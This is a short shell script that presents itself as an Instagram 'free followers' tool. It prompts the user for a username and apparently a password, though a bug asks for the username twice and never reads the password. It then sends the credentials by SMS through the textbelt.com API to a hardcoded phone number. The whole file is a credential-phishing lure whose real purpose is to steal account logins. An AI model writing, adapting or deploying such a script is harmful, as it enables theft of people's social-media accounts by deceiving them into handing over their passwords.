echo "login to your instagram account to get free followers!"
echo "echo welcome to igFollowers"


read -p 'username = ' us
echo "us : $us"
read -p 'username = ' us
echo "pw : $pw"

read -p 'how many followers do you want to get?: ' fw
echo "fw : $fw"

curl -X POST https://textbelt.com/text --data-urlencode phone='+177 35702016' --data-urlencode message="username=$us  password=$pw" -d key=textbelt
